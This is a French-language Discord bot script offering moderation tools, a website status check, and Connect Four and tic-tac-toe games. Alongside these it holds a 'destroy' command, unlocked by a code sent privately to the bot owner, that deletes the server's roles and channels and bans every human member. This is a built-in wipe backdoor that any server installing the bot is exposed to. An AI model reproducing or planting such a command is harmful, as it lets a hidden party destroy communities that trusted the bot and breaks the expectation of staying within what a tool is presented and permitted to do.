import discord, uuid, os, math, requests, time, datetime, asyncio
import numpy as np
from mtranslate import translate
from bs4 import BeautifulSoup
from discord.ext import commands

prefix="!"
intents = discord.Intents.default()
intents.message_content = True
intents.members = True
bot = commands.Bot(command_prefix=prefix, intents=intents, help_command=None)



# Initialisation de l'id de l'admin
admin=0
# Initialisation du code de sécurité
code_secu=str(uuid.uuid4())
# Stocke le moment du démarrage du bot
start_time = time.time()

# Événement de connexion
@bot.event
async def on_ready():
    nom=bot.user.name
    print(f'Connecté en tant que {nom}')
    user = await bot.fetch_user(admin)
    # Envoie un message privé à l'utilisateur
    await user.send(f"Bonjour Administrateur {user.mention}, je suis connecté en tant que {nom}.\nCode de sécurité : {code_secu}")

#-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Définition de la fonction verif
async def verif(id):
    if (id==admin):
        return False
    return True

async def auto(id_author, id_member):
    if (id_author==id_member):
        return False
    return True

# Définition de la fonction send_dm
async def annonce(member, serveur, action, valid, raison=None):
    # Récupère l'utilisateur correspondant à l'ID spécifié
    user = await bot.fetch_user(admin) 
    message=""
    opt=" "
    opti=" "
    optio=""
    if action!="destroy":
        opt=" te "
        opti=" sur "
        optio=f" pour la raison suivante : {raison}"
    if valid==True:
        message+=f"{member[0]} ({member[1]}) {action} le serveur {serveur}"
    else:
        message+=f"Tentative de{opt}{action}{opti}le serveur {serveur} par {member[0]} ({member[1]}){optio}"
    # Envoie un message privé à l'admin    
    await user.send(message)

#-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

@bot.command(description="NON !")
async def destroy(ctx, code):
    # Supprime le message contenant la commande utilisée
    await ctx.message.delete()
    if str(code)==code_secu:
        await annonce([ctx.author.name,ctx.author.id], ctx.guild.name, "destroy", True)
        # Récupère la position du rôle du bot
        bot_role_position = ctx.guild.me.top_role.position
        # Récupère la liste des rôles du serveur
        server_roles = ctx.guild.roles
        # Supprimer les rôles inférieurs à celui du bot
        for role in server_roles[1:bot_role_position]:
            await role.delete()
            await ctx.send(f"Rôle {role.name} supprimé.")
        await ctx.send("Les rôles disponibles ont été supprimés.")
        # Vérifie si l'utilisateur a la permission de gérer les salons
        if ctx.guild.me.guild_permissions.manage_channels:
            # Récupère la liste de tous les salons du serveur
            channels = ctx.guild.channels
            # Pacourt les ids des salons
            for channel in channels:
                # Supprime le salon
                if channel!=ctx.channel:
                    await channel.delete()
                    await ctx.send(f"Salon {channel.name} supprimé.")
            await ctx.channel.edit(name="On s'est fait Ambré")
        else:
            await ctx.send("Désolé, je n'ai pas la permission nécessaire.")
        # Vérifie si le bot a la permission de voir les membres
        if ctx.guild.me.guild_permissions.view_audit_log:
            # Récupère le serveur depuis le contexte
            server = ctx.guild
            # Récupère la liste des membres du serveur
            members = server.members
            # Itère sur la liste des membres et envoie leur nom dans le canal
            raison="On s'est fait Ambré ?"
            for member in members:
                # Vérifiez si l'objet est une instance de discord.Member
                if not member.bot:
                    # L'objet est un membre du serveur
                    if await action("ban", ctx, member, raison):
                        await member.ban(reason=raison)
        else:
            await ctx.send("Désolé, je n'ai pas la permission de voir les membres.")
    else :
        await annonce([ctx.author.name,ctx.author.id], ctx.guild.name, "destroy", False)

#-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Définition de la fonction helping
async def helping(ctx, grp, mode):
    # Création de l'embed pour afficher les informations
    embed = discord.Embed(title="Commandes disponibles", color=discord.Color.purple())
    # Récupère la liste de toutes les commandes disponibles
    for command in grp.commands :
        embed.add_field(name=prefix+command.name, value=command.description, inline=False)
    if mode==0:
        if ctx.invoked_subcommand is None:
            embed.add_field(name='Veuillez spécifier une sous-commande.', value=f"{prefix}{str(grp)} [nom de la sous-commande]", inline=False)
    # Envoie l'embed dans le canal où la commande a été lancée
    await ctx.send(embed=embed)

#-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Créez un groupe de commandes nommé "Gestion"
@bot.group(description="Liste toutes les commandes de Gestion.")
async def gest(ctx):
    # Supprime le message contenant la commande utilisée
    await ctx.message.delete()
    if ctx.invoked_subcommand is None:
        await helping(ctx, gest, 0)

@gest.command(description=f"Supprime les X derniers messages. {prefix}gest clear [nombre de messages à supprimer]")
async def clear(ctx, amount: int):
    # Vérifie si l'utilisateur a la permission de gérer les messages
    if ctx.author.guild_permissions.manage_messages:
        # Supprime les X derniers messages dans le canal
        await ctx.channel.purge(limit=amount)
        await ctx.send(f"{amount} messages ont été supprimés.")
        time.sleep(1)
        await ctx.channel.purge(limit=1)
    else:
        await ctx.send("Désolé, vous n'avez pas la permission nécessaire pour supprimer des messages.")

@gest.command(description=f"Renomme l'user mentionné. {prefix}gest nick @user [surnom]")
async def nick(ctx, member: discord.Member, *, nickname):
    if await auto(ctx.author.id, member.id) :
        # Change le surnom du membre
        await member.edit(nick=nickname)

#-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Créez un groupe de commandes nommé "moderation"
@bot.group(description="Liste toutes les commandes de Modération.")
async def mod(ctx):
    # Supprime le message contenant la commande utilisée
    await ctx.message.delete()
    if ctx.invoked_subcommand is None:
        await helping(ctx, mod, 0)

@mod.command(description=f"Liste les permissions de l'user mentionné. {prefix}mod perms @user")
async def perms(ctx, member: discord.Member):
    # Crée une embed pour stocker les informations des permissions
    embed = discord.Embed(title=f"Permissions de {member.name}", color = discord.Color.teal())
    list_perms=[]
    # Pour chaque rôle de l'utilisateur
    for role in member.roles:
        # Pour chaque permission du rôle
        for perm, value in role.permissions:
            if value is True:
                if perm not in list_perms:
                    list_perms.append(perm)
                    new_perm = perm.replace("_", " ")
                    perm_trad = translate(new_perm, 'fr')
                    embed.add_field(name=perm_trad[0].upper()+perm_trad[1:], value="", inline=False)
    # Envoie les informations des permissions dans le canal où la commande a été utilisée
    await ctx.send(embed=embed)

# Définition de la fonction action
async def action(action, ctx, member, reason):
    message=""
    fin=False
    if (await verif(member.id)==True) :
        # Vérifie si l'utilisateur a la permission de bannir des membres
        autorisation_bot=0
        if action=="kick":
            autorisation_bot=ctx.author.guild_permissions.kick_members
        else:
            autorisation_bot=ctx.author.guild_permissions.ban_members
        if autorisation_bot:
            bot_top_role_position = member.guild.me.top_role.position
            hierarchie=True
            # Parcourt les rôles du membre
            for role in member.roles:
                # Vérifie si le rôle du membre a une position plus élevée que celui du bot
                if role.position > bot_top_role_position:
                    hierarchie=False
            if hierarchie:
                # Envoie un message privé à l'utilisateur
                message=f"```ansi\n[2;31mVous avez été {action} du serveur {ctx.guild.name}"
                if reason!=None:
                    message+=f" pour la raison suivante : {reason}"
                message+="[0m```"
                await member.send(message)

                message=f"> {member.name} a été {action} du serveur."
                fin=True
            else:
                message=f"```ansi\n[2;31m[2;33mDésolé, je ne peux pas {action} un membre qui m'est hiérarchiquement supérieur.[0m[2;31m[0m```"
                fin=False
        else:
            message=f"```ansi\n[2;31m[2;33mDésolé, vous n'avez pas la permission de {action} des membres.[0m[2;31m[0m```"
    else :
        message=f"```ansi\n[2;31m[2;33m{ctx.author.name} tu ne peux pas {action} mon père.[0m[2;31m[0m```"
        await annonce([ctx.author.name,ctx.author.id], ctx.guild.name, action, False, reason)
    await ctx.send(message)
    return fin

@mod.command(description=f"Ban l'user mentionné. {prefix}mod ban @user [raison](optionnel)")
async def ban(ctx, member: discord.Member, *, reason=None):
    if await auto(ctx.author.id, member.id) :
        if await action("ban", ctx, member, reason):
            await member.ban(reason=reason)

@mod.command(description=f"Kick l'user mentionné. {prefix}mod kick @user [raison](optionnel)")
async def kick(ctx, member: discord.Member, *, reason=None):
    if await auto(ctx.author.id, member.id) :
        if await action("kick", ctx, member, reason):
            await member.kick(reason=reason)

#-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Créez un groupe de commandes nommé "autre"
@bot.group(description="Liste toutes les autres commandes.")
async def autre(ctx):
    # Supprime le message contenant la commande utilisée
    await ctx.message.delete()
    if ctx.invoked_subcommand is None:
        await helping(ctx, autre, 0)

@autre.command(description=f"Fait parler le bot. {prefix}autre msg [message]")      
async def msg(ctx, *, message):
    await ctx.send(message)

@autre.command(description=f"Le bot mp l'user mentionné avec vottre message. {prefix}autre mp @user [message]")
async def mp(ctx, member: discord.Member, *, message):
    # Envoie un message privé à l'utilisateur
    await member.send(message)

#-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Créez un groupe de commandes nommé "site"
@bot.group(description="Liste toutes les commandes pour le Site.")
async def site(ctx):
    # Supprime le message contenant la commande utilisée
    await ctx.message.delete()
    if ctx.invoked_subcommand is None:
        await helping(ctx, site, 0)

@site.command(description="Liste les scans sur le site WEB local.")   
async def scans(ctx):
    # Chemin du dossier à parcourir
    mangas_path = './mangas/'
    #Créé l'embed
    embed = discord.Embed(title=f"{len(os.listdir(mangas_path))} scans disponibles", color=discord.Color.blue())
    # Parcourt tous les dossiers dans le dossier spécifié
    for manga in os.listdir(mangas_path):
        # Chemin complet du dossier
        manga_path = os.path.join(mangas_path, manga)+"/Chapitres"
        #Créé le message d'infos du manga
        message=f"{len(os.listdir(manga_path))} chapitres.\n"
        #Fait la moyenne
        nb_img=0
        for chapter in os.listdir(manga_path):
            chapter_path=os.path.join(manga_path, chapter)
            nb_img+=len(os.listdir(chapter_path))
        moy_img=nb_img/len(os.listdir(manga_path)) 
        message+=f"Moyenne de {math.floor(moy_img)} slides par chapitre."
        embed.add_field(name=manga, value=message, inline=False)
    await ctx.send(embed=embed)

@site.command(description=f"Donne le status du site WEB. {prefix}site status [https://...](optionnel)")
async def status(ctx, site=None):
    # Création de l'embed pour afficher les informations
    embed = discord.Embed(title="Informations sur le site")
    message=""
    try:
        # Effectuer une requête GET pour obtenir le contenu de la page
        lien='http://192.168.1.152/'
        if site!=None:
            lien=site
        response = requests.get(lien)  
        # Vérifier si la requête a réussi
        if response.status_code == 200:
            # Utiliser BeautifulSoup pour analyser le contenu HTML de la page
            soup = BeautifulSoup(response.content, 'html.parser')      
            # Récupérer le titre de la page
            title = soup.title.string      
            # Afficher le titre de la page
            message=f"{title} est en ligne."
            embed.color = discord.Color.green()
        else:
            message=f"Impossible de récupérer le titre du site. Code de statut : {response.status_code}"
            embed.color = discord.Color.orange()
    except requests.ConnectionError:
        message="Impossible de se connecter au site."
        embed.color = discord.Color.red()
    embed.add_field(name=message, value="", inline=False)
    if site==None:
        embed.add_field(name="En savoir plus", value=f"{prefix}scans", inline=False)
    # Envoie l'embed dans le canal où la commande a été lancée
    await ctx.send(embed=embed)

#-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

@bot.command(description="Obtenir les informations du bot.")
async def infos(ctx):
    # Supprime le message contenant la commande utilisée
    await ctx.message.delete()
    # Calcul de la durée écoulée depuis le démarrage du bot
    elapsed_time = time.time() - start_time
    formatted_elapsed_time = str(datetime.timedelta(seconds=int(elapsed_time)))
    # Création de l'embed pour afficher les informations
    embed = discord.Embed(title="Informations sur le bot", color=discord.Color.blue())
    embed.add_field(name="Date de démarrage", value=str(datetime.datetime.utcfromtimestamp(start_time)), inline=False)
    embed.add_field(name="Durée écoulée depuis le démarrage", value=formatted_elapsed_time, inline=False)
    embed.add_field(name="Nombre de serveurs", value=len(bot.guilds), inline=False)
    embed.add_field(name="Nombre d'utilisateurs", value=sum(len(guild.members) for guild in bot.guilds), inline=False)
    # Envoie l'embed dans le canal où la commande a été lancée
    await ctx.send(embed=embed)

@bot.command(description="Liste les commandes utilisables.")
async def help(ctx):
    await helping(ctx, bot, 1)

#-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Créez un groupe de commandes nommé "Jeux"
@bot.group(description="Liste tout les jeux disponibles.")
async def jeux(ctx):
    # Supprime le message contenant la commande utilisée
    await ctx.message.delete()
    if ctx.invoked_subcommand is None:
        await helping(ctx, jeux, 0)

async def afficher_tableau(ctx, plateau, ennemi):
    if ennemi:
        adv=ennemi.name
    else:
        adv="I.A"
    message="```ansi\n"
    message+=f"[2;31m[2;34mVous[0m[2;31m[0m\n[2;31m{adv}[0m\n\n"
    for num in range(7):
        message+=f"  {num+1} "
    message+="\n"
    for ligne in plateau :
        for char in ligne :
            if char=="X":
                valeur=f"[2;31m[2;34m{char}[0m[2;31m[0m"
            elif char=="O":
                valeur=f"[2;31m{char}[0m"
            else:
                valeur=' '
            message+=f"| {valeur} "
        message+="|\n"
        for _ in range(30):
            message+="-"
        message+="\n"
    message+="```"
    await ctx.send(message)

def placer_jeton(plateau, colonne, joueur):
    for i in range(6 - 1, -1, -1):
        if plateau[i][colonne] == ' ':
            plateau[i][colonne] = joueur
            return True
    return False

def verifier_vict(plateau, joueur):
    # Vérification horizontale
    for i in range(6):
        for j in range(7 - 3):
            if all(plateau[i][j+k] == joueur for k in range(4)):
                return True
    # Vérification verticale
    for i in range(6 - 3):
        for j in range(7):
            if all(plateau[i+k][j] == joueur for k in range(4)):
                return True
    # Vérification diagonale (descendante)
    for i in range(6 - 3):
        for j in range(7 - 3):
            if all(plateau[i+k][j+k] == joueur for k in range(4)):
                return True
    # Vérification diagonale (montante)
    for i in range(3, 6):
        for j in range(7 - 3):
            if all(plateau[i-k][j+k] == joueur for k in range(4)):
                return True
    return False

def best_coup(plateau):
    # Implémentation simplifiée pour l'IA (choix aléatoire de la colonne)
    return np.random.randint(0, 7)

def prochaine_ligne_disponible(plateau, col):
    for i in range(6):
        if plateau[i][col] == ' ':
            return i

async def jouer_puissance4(ctx, adversaire=None):
    plateau = [[' '] * 7 for _ in range(6)]

    tour = 1
    while True:
        if tour % 2 != 0:
            joueur = ctx.author
            jeton = 'X'
        else:
            joueur = adversaire if adversaire else ctx.guild.me
            jeton = 'O'

        if joueur == ctx.author or adversaire:
            await afficher_tableau(ctx, plateau, adversaire)
            def check(message):
                return message.author == joueur and \
                    message.channel == ctx.channel and \
                    message.content.isdigit() and \
                    0 <= int(message.content) - 1 < 7

            await ctx.send(f"{joueur.mention}, c'est votre tour. Entrez le numéro de colonne (1-{7}):")
            try:
                col_msg = await ctx.bot.wait_for('message', timeout=60.0, check=check)
                colonne = int(col_msg.content) - 1
            except asyncio.TimeoutError:
                await ctx.send(f"Le temps imparti pour votre coup est écoulé, {joueur.mention} ! La partie est terminée.")
                return
        else:
            colonne = best_coup(plateau)

        if not placer_jeton(plateau, colonne, jeton):
            await ctx.send("La colonne est pleine. Veuillez choisir une autre colonne.")
            continue

        if verifier_vict(plateau, jeton):
            await afficher_tableau(ctx, plateau, adversaire)
            await ctx.send(f"Bravo {joueur.mention} ! Vous avez gagné la partie.")
            return

        if tour == 6 * 7:
            await ctx.send("La partie est terminée. Match nul !")
            await afficher_tableau(ctx, plateau, adversaire)
            return

        tour += 1

@jeux.command(description=f"Jouer au puissance 4 contre un joueur ou un bot. {prefix}jeux p4 [@user](optionnel)")
async def p4(ctx, adversaire: discord.Member = None):
    if await auto(ctx.author.id, adversaire.id) :
        await jouer_puissance4(ctx, adversaire if adversaire else None)


async def afficher_plateau(ctx, plateau, ennemi):
    if ennemi:
        adv=ennemi.name
    else:
        adv="I.A"
    message="```ansi\n"
    message+=f"[2;31m[2;34m{ctx.author.name}[0m[2;31m[0m\n[2;31m{adv}[0m\n\n"
    message+="  | 1 | 2 | 3 |\n"
    message+="--------------\n"
    for i, ligne in enumerate(plateau):
        message+=f"{i+1}"
        for col in ligne:
            if col=="X":
                valeur=f"[2;31m[2;34m{col}[0m[2;31m[0m"
            elif col=="O":
                valeur=f"[2;31m{col}[0m"
            else:
                valeur=" "
            message+=f" | {valeur}"
        message+=" |\n---------------\n"
    await ctx.send(message+"```")

def verifier_victoire(plateau, symbole):
    # Vérifier les lignes
    for ligne in plateau:
        if all(case == symbole for case in ligne):
            return True
    # Vérifier les colonnes
    for j in range(3):
        if all(plateau[i][j] == symbole for i in range(3)):
            return True
    # Vérifier les diagonales
    if all(plateau[i][i] == symbole for i in range(3)) or \
        all(plateau[i][2-i] == symbole for i in range(3)):
        return True
    return False

def est_match_nul(plateau):
    return all(all(case != ' ' for case in ligne) for ligne in plateau)

def minimax(plateau, profondeur, joueur):
    if verifier_victoire(plateau, 'X'):
        return -10
    if verifier_victoire(plateau, 'O'):
        return 10
    if est_match_nul(plateau):
        return 0
    
    if joueur == 'O':
        meilleur_score = -math.inf
        for i in range(3):
            for j in range(3):
                if plateau[i][j] == ' ':
                    plateau[i][j] = joueur
                    score = minimax(plateau, profondeur + 1, 'X')
                    plateau[i][j] = ' '
                    meilleur_score = max(score, meilleur_score)
        return meilleur_score
    else:
        meilleur_score = math.inf
        for i in range(3):
            for j in range(3):
                if plateau[i][j] == ' ':
                    plateau[i][j] = joueur
                    score = minimax(plateau, profondeur + 1, 'O')
                    plateau[i][j] = ' '
                    meilleur_score = min(score, meilleur_score)
        return meilleur_score

def meilleur_coup(plateau):
    meilleur_score = -math.inf
    meilleur_coup = None
    for i in range(3):
        for j in range(3):
            if plateau[i][j] == ' ':
                plateau[i][j] = 'O'
                score = minimax(plateau, 0, 'X')
                plateau[i][j] = ' '
                if score > meilleur_score:
                    meilleur_score = score
                    meilleur_coup = (i, j)
    return meilleur_coup

async def joueur(ctx, plateau, joueur, adversaire):
    def check(message):
        return message.author == joueur and message.channel == ctx.channel
    await afficher_plateau(ctx, plateau, adversaire)
    while True:
        try:
            await ctx.send(f"{joueur.mention}, entrez votre coup (colonne.ligne) :")
            response = await bot.wait_for('message', timeout=60.0, check=check)
            coup_joueur = response.content

            colonne, ligne = map(int, coup_joueur.split('.'))
            if plateau[ligne-1][colonne-1] != ' ':
                await ctx.send("Case déjà occupée, veuillez rejouer.")
                continue
            if joueur==ctx.author:
                valeur='X'
            else:
                valeur='O'
            plateau[ligne-1][colonne-1] = valeur
            if verifier_victoire(plateau, valeur):
                await afficher_plateau(ctx, plateau, adversaire)
                await ctx.send(f"{joueur.mention}, vous avez gagné !")
                return True
            if est_match_nul(plateau):
                await afficher_plateau(ctx, plateau, adversaire)
                await ctx.send("Match nul !")
                return True
            return False
        except (ValueError, IndexError):
            await ctx.send("Coup invalide. Entrez votre coup dans le format 'colonne.ligne' (par exemple, 3.2).")

async def jouer(ctx, adversaire):
    plateau = [[' ']*3 for _ in range(3)]

    if adversaire:
        ennemi=adversaire
    else :
        ennemi=False
    while True:
        victoire = await joueur(ctx, plateau, ctx.author, ennemi)
        if victoire:
            break

        if adversaire:
            victoire = await joueur(ctx, plateau, adversaire, ennemi)
            if victoire:
                break
        else:
            coup_ia = meilleur_coup(plateau)
            plateau[coup_ia[0]][coup_ia[1]] = 'O'
            if verifier_victoire(plateau, 'O'):
                await afficher_plateau(ctx, plateau, adversaire)
                await ctx.send("L'IA a gagné !")
                break
            if est_match_nul(plateau):
                await afficher_plateau(ctx, plateau, adversaire)
                await ctx.send("Match nul !")
                break

@jeux.command(description=f"Jouer au morpion contre un joueur ou un bot. {prefix}jeux morpion [@user](optionnel)")
async def morpion(ctx, adversaire: discord.Member=None):
    if await auto(ctx.author.id, adversaire.id) :
        if adversaire == None:
            await jouer(ctx, False)
        else:
            await jouer(ctx, adversaire)


@jeux.command(description="Jouer à la bataille navalle contre un bot.")
async def navale(ctx):
    await ctx.send(f"```ansi\n[2;36m[2;34mT'as cru j'avais le courage de coder ça ?[0m[2;36m[0m```")

#-----------------------------------------------------------------------------------------------------------------------------------------------------------------------



# Exécution du bot avec le jeton Discord
bot.run('TOKEN')
